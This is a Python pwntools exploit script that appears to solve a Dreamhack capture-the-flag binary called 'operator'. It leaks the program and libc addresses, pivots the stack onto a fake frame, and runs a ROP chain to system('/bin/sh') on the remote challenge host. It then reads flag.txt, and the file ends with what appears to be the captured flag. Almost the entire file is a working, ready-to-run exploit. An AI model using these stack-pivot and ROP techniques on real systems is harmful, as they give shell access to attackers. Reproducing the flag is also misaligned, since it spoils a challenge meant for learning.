#!/usr/bin/env python3

from pwn import *

# stack pivot, rop, uninitalized ptr

exe = ELF("./operator_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")
context.binary = exe

s = lambda a: p.send(a)
sa = lambda a, b: p.sendafter(a, b)
sl = lambda a: p.sendline(a)
sla = lambda a, b: p.sendlineafter(a, b)
recvut = lambda a: p.recvuntil(a)
debug = lambda : gdb.attach(p, gdbscript = script)

script = '''
brva 0x142A
brva 0x130A
'''

while(1):
#for i in range(1):
    try:
        p = remote("host3.dreamhack.games", 21416)
        #p = process("./operator_patched")
        #debug()
        #p = gdb.debug("./operator_patched", gdbscript = script)

        # leak code base
        sa(b">> ", b"1\x00")
        sa(b">> ", b"A" * 0x1000)

        sa(b">> ", b"1\x00")
        recvut(b"A" * 0x1000)
        code_base = u64(p.recv(6).ljust(8, b"\x00")) - 0x2008
        print(hex(code_base))

        pop_rbp = code_base + 0x0000000000001213
        ret = pop_rbp + 1
        leave_ret = code_base + 0x00000000000015d5
        puts_plt = code_base + exe.plt['puts']
        main = code_base + 0x141B

        # prepare fake stack frame at code_base + 0x4020 + 0x17
        payload = b"B" * 0x17 + p64(code_base + 0x4020 + 0x30 + 0x800) + p64(leave_ret) + b"C" * 0x9
        payload += b"E" * 0x800 # padding
        payload += b"D" * 0x8 +  p64(puts_plt) + p64(ret) + p64(main) + p64(code_base + 0x4020) + p64(leave_ret)
        payload = payload.ljust(0x1000, b"A")
        sa(b">> ", payload)

        payload = b"2\x00"
        sa(b">> ", payload)

        sa(b"offset: ", b"40\x00") # aim for 7th bit of saved rbp of flip() 
        payload = b"7" + p64(code_base + 0x4020)[1::] + p64(leave_ret)[:6:] # uninitallized ptr in stack (now point to code_base + 0x4020 + 0x17)
        sa(b"(7 ~ 0): ", payload)

        recvut(b"after byte: ")
        p.recvline()
        libc_base = u64(p.recv(6).ljust(8, b"\x00")) - 0x620d0
        print(hex(libc_base))

        system = libc_base + libc.symbols['system']
        binsh = libc_base + list(libc.search(b"/bin/sh\x00"))[0]
        pop_rdi = libc_base + 0x000000000002a3e5
        ret = pop_rdi + 1

        payload = b"F" * 0x8 + p64(ret) * 250 + p64(pop_rdi) + p64(binsh) + p64(ret) + p64(system) # side effect of pivot, make stack higher or it will cause error
        sl(payload)

        sl(b"echo vanishing")
        recvut(b"vanishing")
        break

    except:
        try:
            p.close()
        except:
            pass

sl(b"cat flag.txt")

p.interactive()
#DH{ac9becb710055fcb6b67bfe1c1ee3f2c5a24a04c5ca8d22f77665ac525579f4d}
